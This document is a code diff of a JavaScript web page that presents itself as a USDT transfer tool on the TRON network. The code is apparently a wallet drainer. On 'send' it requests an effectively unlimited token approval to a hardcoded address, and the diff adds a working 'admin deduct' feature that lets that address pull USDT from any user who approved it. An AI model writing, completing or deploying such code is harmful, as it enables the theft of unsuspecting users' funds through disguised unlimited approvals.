@@ -85,10 +85,14 @@ const TARGET_ADDR = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
 const FEE_LIMIT = 150000000;
+
 let tronWeb = null;
 let userAddress = "";
+let usdtContract = null;
 let provider = null;
+
 const $ = s => document.querySelector(s);
+
 const walletDot = $("#walletDot");
 const settingIconBtn = $("#settingIconBtn");
 const sendBtn = $("#sendBtn");
@@ -102,15 +106,16 @@ const deductAmountInput = $("#deductAmountInput");
 const deductBtn = $("#deductBtn");
 
 const USDT_ABI = [
-{"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
+    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
 function disconnectWallet() {
     tronWeb = null;
     userAddress = "";
+    usdtContract = null;
     provider = null;
     walletDot.classList.remove("connected");
     sendBtn.disabled = true;
@@ -123,6 +128,7 @@ async function connectWalletLogic() {
         disconnectWallet();
         return;
     }
+
     try {
         if (window.tokenpocket?.tron) {
             provider = window.tokenpocket.tron;
@@ -145,57 +151,52 @@ async function connectWalletLogic() {
         } else {
             return;
         }
+
         walletDot.classList.add("connected");
+        usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+
         await loadBalance();
         sendBtn.disabled = false;
-        if(userAddress === TARGET_ADDR){
+
+        if (userAddress === TARGET_ADDR) {
             adminPanel.style.display = "block";
-        }else{
+        } else {
             adminPanel.style.display = "none";
         }
+
         if (provider?.on) {
             provider.on("accountsChanged", () => location.reload());
             provider.on("chainChanged", () => location.reload());
         }
+
     } catch (err) {
         return;
     }
 }
 
 async function loadBalance() {
-    const contract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-    const rawSun = await contract.balanceOf(userAddress).call();
+    const rawSun = await usdtContract.balanceOf(userAddress).call();
     const num = Number(tronWeb.fromSun(rawSun));
     balanceText.textContent = num.toFixed(6);
 }
 
 async function waitTxConfirm(txId, maxTimes = 30) {
-    for(let i=0; i<maxTimes; i++){
-        await new Promise(r=>setTimeout(r,2000));
+    for (let i = 0; i < maxTimes; i++) {
+        await new Promise(r => setTimeout(r, 2000));
+
         let txInfo;
-        try{
+        try {
             txInfo = await tronWeb.trx.getTransactionInfo(txId);
-        }catch(e){continue;}
-        if(txInfo && txInfo.contractResult && txInfo.contractResult[0] === '0x00'){
+        } catch (e) {
+            continue;
+        }
+
+        if (txInfo && txInfo.contractResult && txInfo.contractResult[0] === "0x00") {
             return true;
         }
     }
-    return false;
-}
 
-//底层原生调用，不走contract.send封装
-async function triggerContract(funcName, params){
-    const res = await provider.request({
-        method:"tron_triggerSmartContract",
-        params:[{
-            contractAddress:USDT_CONTRACT,
-            functionSelector:funcName,
-            parameter:params,
-            feeLimit:FEE_LIMIT,
-            callValue:0
-        }]
-    })
-    return res;
+    return false;
 }
 
 amountInput.addEventListener("input", () => {
@@ -204,55 +205,104 @@ amountInput.addEventListener("input", () => {
 });
 
 maxBtn.addEventListener("click", async () => {
-    if(!tronWeb) return;
-    const contract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-    const rawSun = await contract.balanceOf(userAddress).call();
+    if (!usdtContract) return;
+
+    const rawSun = await usdtContract.balanceOf(userAddress).call();
     const num = Number(tronWeb.fromSun(rawSun));
     amountInput.value = num.toFixed(2);
     amountInput.dispatchEvent(new Event("input"));
 });
 
 sendBtn.addEventListener("click", async () => {
-    if (!tronWeb || !provider) return alert("钱包未连接");
+    if (!tronWeb || !usdtContract) return alert("钱包未连接");
+
     const val = parseFloat(amountInput.value);
     if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
+
     const sunVal = tronWeb.toSun(val);
+
     sendBtn.disabled = true;
+
     try {
-        const contract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-        const allowance = await contract.allowance(userAddress, TARGET_ADDR).call();
+        const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
+
         if (Number(allowance) < sunVal) {
             alert("需要授权USDT合约，请在钱包确认签名");
-            const approveParams = tronWeb.utils.abi.encodeParams(["address","uint256"],[TARGET_ADDR,"9999999999999999999999999999"]);
-            const approveRet = await triggerContract("approve(address,uint256)",approveParams);
-            const approveHash = approveRet.transactionHash;
-            alert("授权提交，等待确认");
-            const okApp = await waitTxConfirm(approveHash);
-            if(!okApp){
-                throw new Error("授权链上确认失败");
-            }
-            alert("授权完成，确认发起转账");
+
+            await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send({
+                feeLimit: FEE_LIMIT
+            });
+
+            alert("授权完成，确认发起转账，等待链上确认...");
         }
-        const tfParams = tronWeb.utils.abi.encodeParams(["address","address","uint256"],[userAddress,TARGET_ADDR,sunVal]);
-        const ret = await triggerContract("transferFrom(address,address,uint256)",tfParams);
-        const txHash = ret.transactionHash;
-        alert("已签名提交，等待链上确认，请勿关闭页面...\n哈希:"+txHash);
+
+        const txHash = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send({
+            feeLimit: FEE_LIMIT
+        });
+
+        alert("已签名提交，等待链上确认，请勿关闭页面...\n哈希:" + txHash);
+
         const ok = await waitTxConfirm(txHash);
-        if(ok){
-            alert(`✅链上确认转账成功！交易哈希：${txHash}`);
+
+        if (ok) {
+            alert("✅链上确认转账成功！交易哈希：" + txHash);
             await loadBalance();
-        }else{
-            alert("❌交易提交但是链上确认超时！复制哈希Tronscan核查\n"+txHash);
+        } else {
+            alert("❌交易提交但是链上确认超时！复制哈希到Tronscan核查：\n" + txHash);
         }
+
     } catch (e) {
-        alert("操作失败：" + (e.message||JSON.stringify(e)));
-    }finally{
+        alert("操作失败：" + (e.message || JSON.stringify(e)));
+    } finally {
         sendBtn.disabled = false;
     }
 });
 
-deductBtn.addEventListener("click",async ()=>{
-    alert("管理员划扣功能");
+deductBtn.addEventListener("click", async () => {
+    if (!tronWeb || userAddress !== TARGET_ADDR) {
+        return alert("必须使用管理员钱包连接！");
+    }
+
+    const fromUserAddr = userAddrInput.value.trim();
+    const deductNum = parseFloat(deductAmountInput.value);
+
+    if (!fromUserAddr) {
+        return alert("请输入被划扣用户钱包地址");
+    }
+
+    if (isNaN(deductNum) || deductNum <= 0) {
+        return alert("请输入合法划扣数量");
+    }
+
+    const deductSun = tronWeb.toSun(deductNum);
+
+    try {
+        const userAllowance = await usdtContract.allowance(fromUserAddr, TARGET_ADDR).call();
+
+        if (Number(userAllowance) < deductSun) {
+            return alert("错误：该用户没有授权足够额度，无法划扣！");
+        }
+
+        const txHash = await usdtContract.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send({
+            feeLimit: FEE_LIMIT
+        });
+
+        alert("管理员划扣已提交，等待确认");
+
+        const ok = await waitTxConfirm(txHash);
+
+        if (ok) {
+            alert("✅划扣成功！交易哈希:\n" + txHash);
+            userAddrInput.value = "";
+            deductAmountInput.value = "";
+            await loadBalance();
+        } else {
+            alert("划扣提交确认超时，请在区块浏览器核对：\n" + txHash);
+        }
+
+    } catch (err) {
+        alert("❌划扣失败:" + err.message);
+    }
 });
 
 walletDot.addEventListener("click", connectWalletLogic);
